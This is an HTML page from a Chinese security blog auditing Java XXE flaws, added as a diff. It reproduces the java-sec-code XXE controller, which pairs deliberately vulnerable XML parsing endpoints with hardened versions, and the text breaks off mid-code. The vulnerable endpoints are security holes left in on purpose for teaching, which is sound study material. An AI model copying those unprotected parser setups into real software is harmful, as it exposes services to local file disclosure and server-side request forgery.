@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="xxe的java代码审计项目代码审计基于这个项目： https:&#x2F;&#x2F;github.com&#x2F;JoyChou93&#x2F;java-sec-code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe的java代码审计">
+<meta property="og:url" content="http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="毛利小五郎">
+<meta property="og:description" content="xxe的java代码审计项目代码审计基于这个项目： https:&#x2F;&#x2F;github.com&#x2F;JoyChou93&#x2F;java-sec-code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/img/20250531171804209.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/img/20250531175531279.png">
+<meta property="article:published_time" content="2025-05-31T07:37:22.000Z">
+<meta property="article:modified_time" content="2025-06-06T07:27:05.300Z">
+<meta property="article:author" content="Mouri-Kogorou">
+<meta property="article:tag" content="-java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/img/20250531171804209.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>xxe的java代码审计</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/02/mysql%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/31/sql%E6%B3%A8%E5%85%A5java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=xxe的java代码审计"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=xxe的java代码审计"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=xxe的java代码审计"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xxe的java代码审计&body=Check out this article: http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=xxe的java代码审计"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=xxe的java代码审计"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=xxe的java代码审计"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=xxe的java代码审计"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=xxe的java代码审计&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=xxe的java代码审计"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">xxe的java代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.1.</span> <span class="toc-text">项目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%8C%85"><span class="toc-number">1.2.</span> <span class="toc-text">相关的包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84-XXE"><span class="toc-number">1.3.1.</span> <span class="toc-text">有回显的 XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DocumentBuilder"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">DocumentBuilder</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84-XXE"><span class="toc-number">1.3.2.</span> <span class="toc-text">无回显的 XXE</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        xxe的java代码审计
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Mouri-Kogorou</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-31T07:37:22.000Z" class="dt-published" itemprop="datePublished">2025-05-31</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/java/" rel="tag">-java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="xxe的java代码审计"><a href="#xxe的java代码审计" class="headerlink" title="xxe的java代码审计"></a>xxe的java代码审计</h1><h2 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h2><p>代码审计基于这个项目：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br></pre></td><td class="code"><pre><span class="line">package org.joychou.controller;</span><br><span class="line"></span><br><span class="line">import org.dom4j.DocumentHelper;</span><br><span class="line">import org.dom4j.io.SAXReader;</span><br><span class="line">import org.slf4j.Logger;</span><br><span class="line">import org.slf4j.LoggerFactory;</span><br><span class="line">import org.springframework.data.web.ProjectedPayload;</span><br><span class="line">import org.springframework.http.HttpEntity;</span><br><span class="line">import org.springframework.http.ResponseEntity;</span><br><span class="line">import org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line">import org.w3c.dom.Document;</span><br><span class="line">import org.w3c.dom.Node;</span><br><span class="line">import org.w3c.dom.NodeList;</span><br><span class="line">import org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line">import org.xml.sax.XMLReader;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">import org.xml.sax.InputSource;</span><br><span class="line"></span><br><span class="line">import javax.xml.parsers.DocumentBuilder;</span><br><span class="line">import javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">import javax.xml.parsers.SAXParserFactory;</span><br><span class="line">import javax.xml.parsers.SAXParser;</span><br><span class="line"></span><br><span class="line">import org.xml.sax.helpers.DefaultHandler;</span><br><span class="line">import org.apache.commons.digester3.Digester;</span><br><span class="line">import org.jdom2.input.SAXBuilder;</span><br><span class="line">import org.joychou.util.WebUtils;</span><br><span class="line">import org.xmlbeam.annotation.XBRead;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Java xxe vuln and security code.</span><br><span class="line"> *</span><br><span class="line"> * @author JoyChou @2017-12-22</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;/xxe&quot;)</span><br><span class="line">public class XXE &#123;</span><br><span class="line"></span><br><span class="line">    private static final Logger logger = LoggerFactory.getLogger(XXE.class);</span><br><span class="line">    private static final String EXCEPT = &quot;xxe except&quot;;</span><br><span class="line"></span><br><span class="line">    @PostMapping(&quot;/xmlReader/vuln&quot;)</span><br><span class="line">    public String xmlReaderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line">            XMLReader xmlReader = XMLReaderFactory.createXMLReader();</span><br><span class="line">            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml</span><br><span class="line">            return &quot;xmlReader xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String xmlReaderSec(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            XMLReader xmlReader = XMLReaderFactory.createXMLReader();</span><br><span class="line">            // fix code start</span><br><span class="line">            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">            //fix code end</span><br><span class="line">            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;xmlReader xxe security code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXBuilderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXBuilder builder = new SAXBuilder();</span><br><span class="line">            // org.jdom2.Document document</span><br><span class="line">            builder.build(new InputSource(new StringReader(body)));  // cause xxe</span><br><span class="line">            return &quot;SAXBuilder xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXBuilderSec(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXBuilder builder = new SAXBuilder();</span><br><span class="line">            builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">            builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">            builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">            // org.jdom2.Document document</span><br><span class="line">            builder.build(new InputSource(new StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;SAXBuilder xxe security code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXReaderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXReader reader = new SAXReader();</span><br><span class="line">            // org.dom4j.Document document</span><br><span class="line">            reader.read(new InputSource(new StringReader(body))); // cause xxe</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;SAXReader xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/SAXReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXReaderSec(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXReader reader = new SAXReader();</span><br><span class="line">            reader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">            reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">            reader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">            // org.dom4j.Document document</span><br><span class="line">            reader.read(new InputSource(new StringReader(body)));</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;SAXReader xxe security code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXParserVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser parser = spf.newSAXParser();</span><br><span class="line">            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml</span><br><span class="line"></span><br><span class="line">            return &quot;SAXParser xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/SAXParser/sec&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXParserSec(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">            spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">            spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">            SAXParser parser = spf.newSAXParser();</span><br><span class="line">            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            